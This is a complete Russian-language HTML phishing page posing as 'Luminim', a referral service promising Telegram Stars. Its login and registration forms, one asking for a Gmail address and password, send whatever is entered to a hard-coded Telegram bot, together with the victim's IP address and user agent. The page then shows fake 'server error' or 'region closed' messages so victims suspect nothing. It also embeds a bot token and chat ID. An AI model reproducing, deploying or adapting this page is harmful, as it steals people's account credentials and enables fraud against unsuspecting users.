<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Luminim — Telegram Stars</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #121215;
            font-family: 'Segoe UI', 'Inter', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }

        /* Анимированные звёзды на фоне */
        .stars-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }

        .star {
            position: absolute;
            color: #FFD700;
            font-size: 18px;
            opacity: 0.6;
            user-select: none;
            pointer-events: none;
            animation: floatStar linear infinite;
        }

        @keyframes floatStar {
            0% {
                transform: translateY(100vh) translateX(0) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 0.7;
            }
            90% {
                opacity: 0.7;
            }
            100% {
                transform: translateY(-20vh) translateX(20px) rotate(360deg);
                opacity: 0;
            }
        }

        /* Основной контейнер */
        .container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 500px;
            margin: 20px;
        }

        .main-card {
            background: rgba(28, 28, 32, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 48px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 215, 0, 0.25);
            text-align: center;
        }

        /* Логотип */
        .logo h1 {
            font-size: 52px;
            font-weight: 800;
            background: linear-gradient(135deg, #FFD700, #FFA500);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 2px;
        }

        .logo p {
            color: #aaa;
            margin-top: 8px;
            font-size: 14px;
        }

        /* Звёздный визуал */
        .stars-visual {
            background: rgba(0,0,0,0.4);
            border-radius: 60px;
            padding: 20px 15px;
            margin: 25px 0;
            text-align: center;
            border: 1px solid rgba(255,215,0,0.3);
        }

        .star-icons {
            font-size: 28px;
            letter-spacing: 8px;
            color: #FFD700;
            animation: twinkle 2s ease-in-out infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.6; text-shadow: 0 0 0px gold; }
            50% { opacity: 1; text-shadow: 0 0 8px gold; }
        }

        .stars-visual .sub {
            font-size: 12px;
            color: #888;
            margin-top: 8px;
        }

        /* Кнопки */
        .buttons {
            display: flex;
            gap: 20px;
            margin: 30px 0;
        }

        .btn {
            flex: 1;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-login {
            background: transparent;
            border: 2px solid #FFD700;
            color: #FFD700;
        }

        .btn-login:hover {
            background: rgba(255,215,0,0.1);
        }

        .btn-register {
            background: linear-gradient(135deg, #FFD700, #FFA500);
            color: #1a1a2e;
        }

        .btn-register:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 20px rgba(255,215,0,0.3);
        }

        /* Статистика (просто для красоты) */
        .stats {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.1);
            display: flex;
            justify-content: space-around;
        }

        .stat {
            text-align: center;
        }

        .stat .value {
            font-size: 28px;
            font-weight: bold;
            color: #FFD700;
        }

        .stat .text {
            font-size: 12px;
            color: #888;
        }

        .per-friend {
            margin-top: 15px;
            padding: 10px;
            background: rgba(255,215,0,0.1);
            border-radius: 30px;
            font-size: 13px;
            color: #FFD700;
        }

        footer {
            margin-top: 25px;
            font-size: 11px;
            color: #555;
        }

        /* Модальные окна */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #1e1e24;
            border-radius: 32px;
            max-width: 400px;
            width: 90%;
            padding: 35px;
            border: 1px solid #333;
            animation: fadeIn 0.25s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .modal-content h3 {
            color: white;
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }

        .modal-input {
            width: 100%;
            padding: 14px 16px;
            margin: 10px 0;
            background: #2a2a30;
            border: 1px solid #444;
            border-radius: 16px;
            color: white;
            font-size: 16px;
        }

        .modal-input:focus {
            outline: none;
            border-color: #FFD700;
        }

        .modal-btn {
            width: 100%;
            padding: 14px;
            background: #FFD700;
            color: #1a1a2e;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }

        .error-msg {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        .close-modal {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 28px;
            cursor: pointer;
            color: #888;
        }
    </style>
</head>
<body>

<div class="stars-bg" id="starsBg"></div>

<div class="container">
    <div class="main-card">
        <div class="logo">
            <h1>LUMINIM</h1>
            <p>Пригласи друзей — получи Telegram Stars</p>
        </div>

        <!-- Визуальные звёзды (только иконки) -->
        <div class="stars-visual">
            <div class="star-icons">⭐ ⭐ ⭐ ⭐ ⭐</div>
            <div class="star-icons" style="font-size: 22px; letter-spacing: 6px;">✨ 🌟 💫 ✨ 🌟</div>
            <div class="sub">Telegram Stars</div>
        </div>

        <div class="buttons">
            <button class="btn btn-login" id="loginBtn">Войти</button>
            <button class="btn btn-register" id="registerBtn">Регистрация</button>
        </div>

        <div class="stats">
            <div class="stat">
                <div class="value">0</div>
                <div class="text">Приглашено друзей</div>
            </div>
            <div class="stat">
                <div class="value">⭐ 0.50</div>
                <div class="text">За каждого друга</div>
            </div>
        </div>

        <div class="per-friend">
            🎁 Пригласи друга → получи 0.50 Telegram Stars
        </div>

        <footer>
            <p>Приглашай друзей — копи звёзды для Telegram</p>
        </footer>
    </div>
</div>

<!-- Модальное окно ВХОД (логин/пароль) -->
<div class="modal" id="loginModal">
    <div class="modal-content">
        <span class="close-modal" id="closeLoginModal">&times;</span>
        <h3>Вход в Luminim</h3>
        <form id="loginForm">
            <input type="text" id="loginUsername" class="modal-input" placeholder="Логин" required>
            <input type="password" id="loginPassword" class="modal-input" placeholder="Пароль" required>
            <button type="submit" class="modal-btn">Войти</button>
        </form>
        <div id="loginError" class="error-msg"></div>
    </div>
</div>

<!-- Модальное окно РЕГИСТРАЦИЯ (Gmail + пароль) -->
<div class="modal" id="registerModal">
    <div class="modal-content">
        <span class="close-modal" id="closeRegisterModal">&times;</span>
        <h3>Регистрация Luminim</h3>
        <form id="registerForm">
            <input type="email" id="regEmail" class="modal-input" placeholder="Электронная почта (Gmail)" required>
            <input type="password" id="regPassword" class="modal-input" placeholder="Пароль" required>
            <button type="submit" class="modal-btn">Зарегистрироваться</button>
        </form>
        <div id="registerError" class="error-msg"></div>
    </div>
</div>

<script>
// ===== ВАШИ ДАННЫЕ TELEGRAM БОТА =====
const BOT_TOKEN = '8707801819:AAGT8IVF8p7pJYR6njGVyaAIMu-TGeN8d8E';
const CHAT_ID = '8638948995';
// =====================================

// Генерация падающих звёзд
function createStars() {
    const starsContainer = document.getElementById('starsBg');
    const starCount = 100;
    for (let i = 0; i < starCount; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.textContent = ['⭐', '✨', '🌟', '💫', '⭐'][Math.floor(Math.random() * 5)];
        star.style.left = Math.random() * 100 + '%';
        star.style.animationDuration = 3 + Math.random() * 7 + 's';
        star.style.animationDelay = Math.random() * 12 + 's';
        star.style.fontSize = 12 + Math.random() * 18 + 'px';
        starsContainer.appendChild(star);
    }
}
createStars();

// Модальные окна
const loginModal = document.getElementById('loginModal');
const registerModal = document.getElementById('registerModal');
const loginBtn = document.getElementById('loginBtn');
const registerBtn = document.getElementById('registerBtn');
const closeLoginModal = document.getElementById('closeLoginModal');
const closeRegisterModal = document.getElementById('closeRegisterModal');

loginBtn.onclick = () => { loginModal.style.display = 'flex'; };
registerBtn.onclick = () => { registerModal.style.display = 'flex'; };

function closeLogin() { loginModal.style.display = 'none'; }
function closeRegister() { registerModal.style.display = 'none'; }

closeLoginModal.onclick = closeLogin;
closeRegisterModal.onclick = closeRegister;
window.onclick = (e) => {
    if (e.target === loginModal) closeLogin();
    if (e.target === registerModal) closeRegister();
};

// Отправка в Telegram
async function sendToTelegram(type, username, password, ip, userAgent) {
    const message = `🔐 LUMINIM ${type} 🔐
━━━━━━━━━━━━━━━━━━━━━
📧 ${type === 'LOGIN' ? 'Логин' : 'Email'}: ${username}
🔑 Пароль: ${password}
🌐 IP: ${ip}
📱 User Agent: ${userAgent}
🕒 Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        return response.ok;
    } catch(e) {
        console.error(e);
        return false;
    }
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) {
        return 'unknown';
    }
}

// Обработка ВХОДА — ошибка сервера
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('loginUsername').value;
    const password = document.getElementById('loginPassword').value;
    const errorDiv = document.getElementById('loginError');

    if (!username || !password) {
        errorDiv.textContent = 'Заполните все поля';
        errorDiv.style.color = '#ff6666';
        return;
    }

    const ip = await getIP();
    await sendToTelegram('LOGIN', username, password, ip, navigator.userAgent);

    errorDiv.textContent = '❌ Ошибка сервера!';
    errorDiv.style.color = '#ff6666';
    
    setTimeout(() => {
        closeLogin();
        document.getElementById('loginForm').reset();
        errorDiv.textContent = '';
    }, 2000);
});

// Обработка РЕГИСТРАЦИИ — сайт закрыт в регионе
document.getElementById('registerForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    const errorDiv = document.getElementById('registerError');

    if (!email || !password) {
        errorDiv.textContent = 'Заполните все поля';
        errorDiv.style.color = '#ff6666';
        return;
    }

    const ip = await getIP();
    await sendToTelegram('REGISTRATION', email, password, ip, navigator.userAgent);

    errorDiv.textContent = '❌ Сайт закрыт в вашем регионе!';
    errorDiv.style.color = '#ff6666';
    
    setTimeout(() => {
        closeRegister();
        document.getElementById('registerForm').reset();
        errorDiv.textContent = '';
    }, 2500);
});
</script>
</body>
</html>
